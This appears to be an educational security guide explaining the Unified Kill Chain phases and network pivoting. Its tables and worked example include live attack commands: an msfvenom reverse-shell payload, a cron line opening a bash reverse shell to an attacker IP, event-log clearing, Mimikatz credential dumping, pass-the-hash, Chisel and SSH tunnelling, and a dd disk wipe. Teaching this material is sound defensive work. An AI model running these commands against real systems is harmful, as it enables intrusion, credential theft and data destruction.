# Unified Kill Chain & Pivoting

## The Big Picture: How It All Works Together
The **Unified Kill Chain (UKC)** is a framework that combines the strategic high-level phases of the Lockheed Martin Cyber Kill Chain with the tactical, detailed techniques of the MITRE ATT&CK framework. 

*Why do we need another framework?* Because modern attacks aren't always a straight line from outside to inside. Attackers loop, pivot, and jump between systems. The UKC models this reality by breaking an attack into three distinct "cycles" or overarching goals, rather than one linear path.

```text
+-----------------------+      +--------------------------+      +-------------------------+
|                       |      |                          |      |                         |
|   INITIAL FOOTHOLD    | ---> |   NETWORK PROPAGATION    | ---> |  ACTION ON OBJECTIVES   |
|   (Getting In)        |      |   (Moving Laterally)     |      |  (Doing the Bad Thing)  |
|                       |      |                          |      |                         |
+-----------------------+      +--------------------------+      +-------------------------+
       ^       |                         ^       |                        ^       |
       |_______|                         |_______|                        |_______|
       (Loops)                           (Loops)                          (Loops)
```

## Cycle 1: Initial Foothold (Getting In)
The goal here is to gain an initial foothold on a target system. 

| Phase | What It Is | Why It Works | Real-Time Technical Scenario |
| :--- | :--- | :--- | :--- |
| **Reconnaissance** | Gathering information about the target. | Attackers use public info (OSINT) or scan public IPs to find weak points without alerting the target. | Running `nmap -p 80,443,22 -sV -Pn 192.168.1.50` to find an outdated Apache server running on port 80. |
| **Weaponization** | Creating a payload tailored to the vulnerability found. | Combines an exploit with a payload (like a reverse shell) so it executes upon delivery. | Generating a malicious payload using `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f elf > shell.elf`. |
| **Delivery** | Sending the weaponized payload to the target. | Uses various channels (email, web, physical) to move the payload from attacker to target. | Sending a phishing email with a macro-enabled Word document, or uploading a PHP web shell via a vulnerable file upload form. |
| **Social Engineering** | Tricking humans into executing the payload. | Humans are often the weakest link; bypassing technical controls by asking the user to bypass them. | An email claiming to be from "IT Support" asking the user to click a link and login to "reset their password." |
| **Exploitation** | Triggering the vulnerability to execute the payload. | Software bugs (like buffer overflows) or misconfigurations allow unintended code execution. | Sending a crafted HTTP request to exploit a SQL Injection flaw: `' OR 1=1; --` to bypass a login prompt. |
| **Persistence** | Ensuring access remains even if the system reboots or the connection drops. | Creating backdoors, scheduled tasks, or new users to maintain access without re-exploiting. | Adding a cron job: `echo "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.5/4444 0>&1'" >> /etc/crontab`. |
| **Defense Evasion** | Hiding the attack from security tools (AV, EDR, Firewalls). | Techniques like obfuscation, encrypting payloads, or disabling logs prevent detection. | Encoding a PowerShell payload using base64 (`powershell -e <base64>`) or clearing Windows Event Logs using `wevtutil cl System`. |
| **Command & Control (C2)** | Establishing a communication channel between the compromised system and the attacker. | The attacker needs a way to send commands and receive output from the infected machine. | The compromised machine reaches out over port 443 (HTTPS) to the attacker's server to blend in with normal web traffic. |

## Cycle 2: Network Propagation (Moving Around)
Once inside, the attacker often finds they aren't on the machine that holds the valuable data. They must map the internal network and move.

### Deep Dive: Pivoting
**Pivoting** is the technique of using a compromised system as a "stepping stone" or proxy to attack other systems on a different network segment that the attacker cannot reach directly.

*Why do we pivot?* Organizations use segmentation (VLANs, Firewalls). An external attacker cannot ping an internal database server directly. But if they compromise a web server that has access to both the external internet AND the internal database network, they can route their traffic *through* the web server.

```text
[Attacker IP: 10.0.0.5]
         |
         | (Direct Access)
         v
[Compromised Web Server (Dual-Homed)]
  Eth0: 192.168.1.10 (Public/DMZ facing)
  Eth1: 10.10.10.10  (Internal Network facing)
         |
         | (Pivoting via SSH Dynamic Port Forwarding or Chisel)
         v
[Target Database Server]
  Eth0: 10.10.10.50 (No internet access)
```

| Phase | What It Is | Why It Works | Real-Time Technical Scenario |
| :--- | :--- | :--- | :--- |
| **Pivoting** | Routing traffic through a compromised machine to reach hidden networks. | Exploits the dual-homed nature or internal network access of the compromised host. | Setting up a SOCKS proxy using Chisel: `./chisel server -p 8000 --reverse` (attacker) and `./chisel client 10.0.0.5:8000 R:socks` (victim). |
| **Discovery** | Mapping the internal network from the perspective of the compromised host. | Uses built-in tools or uploaded scripts to find other hosts, shares, and services. | Running `ping sweep` or `arp -a` on the compromised Linux box, or using `BloodHound` to map Active Directory relationships. |
| **Privilege Escalation** | Gaining higher-level permissions (e.g., from `user` to `root` or `SYSTEM`). | Exploits misconfigurations (weak file permissions, unquoted service paths) or kernel vulnerabilities. | Finding a SUID binary with `find / -perm -4000 -type f 2>/dev/null` and exploiting it to get a root shell. |
| **Credential Access** | Stealing usernames, passwords, or hashes from the system. | Credentials can be reused to access other systems legitimately without exploiting them. | Dumping LSASS memory using Mimikatz (`sekurlsa::logonpasswords`) or stealing the `/etc/shadow` file. |
| **Lateral Movement** | Moving from one system to another using stolen credentials or internal exploits. | Uses legitimate administration tools (RDP, WinRM, SSH) or passing hashes to log into adjacent machines. | Passing the Hash (PtH) using Evil-WinRM: `evil-winrm -i 10.10.10.50 -u Administrator -H <NTLM_Hash>`. |

## Cycle 3: Action on Objectives (The Finale)
The attacker has reached their target system with the necessary privileges. Now they execute their ultimate goal.

| Phase | What It Is | Why It Works | Real-Time Technical Scenario |
| :--- | :--- | :--- | :--- |
| **Execution** | Running malicious code on the target system to achieve the final goal. | Uses the acquired access and privileges to run the final payload. | Executing a custom ransomware binary or a data scraping script on the domain controller. |
| **Collection** | Gathering the sensitive data the attacker wants. | Consolidating files, databases, or emails into a central staging location for easier theft. | Compressing financial documents into an archive: `tar -czvf backup_data.tar.gz /var/www/html/financials/`. |
| **Exfiltration** | Smuggling the stolen data out of the network. | Bypassing Data Loss Prevention (DLP) by hiding data in legitimate protocols (DNS, ICMP, HTTPS). | Sending data over DNS requests or using `curl` to upload the compressed archive to an attacker-controlled AWS S3 bucket. |
| **Impact** | Manipulating, interrupting, or destroying systems and data. | Causes direct harm to the organization's operations or reputation (CIA triad compromise). | Encrypting the entire filesystem and leaving a ransom note, or wiping the hard drive using `dd if=/dev/zero of=/dev/sda`. |

## Theory vs. Hands-on Practice: Pivoting Example

**Theory:** We know the web server (192.168.1.10) can talk to the database (10.10.10.50). We want to run an nmap scan against the database, but our attacker machine (10.0.0.5) cannot route to 10.10.10.50. We must build a tunnel.

**Practice:**
**Observation:** We have an SSH session on the web server as user `www-data`.
**Hypothesis:** If we establish an SSH Dynamic Port Forward, we can route proxychains traffic through it.
**Test (Action):**
1. On attacker machine, create the tunnel using the compromised credentials:
   `ssh -D 9050 www-data@192.168.1.10`
2. Configure `/etc/proxychains.conf` to use `socks4 127.0.0.1 9050`.
3. Run nmap through the proxy:
   `proxychains nmap -sT -Pn -p 3306 10.10.10.50`
**Result:** Nmap traffic is encapsulated in SSH, sent to the web server, which unpacks it and forwards it to the database server.
**Conclusion:** We successfully mapped the internal database port without direct network access.
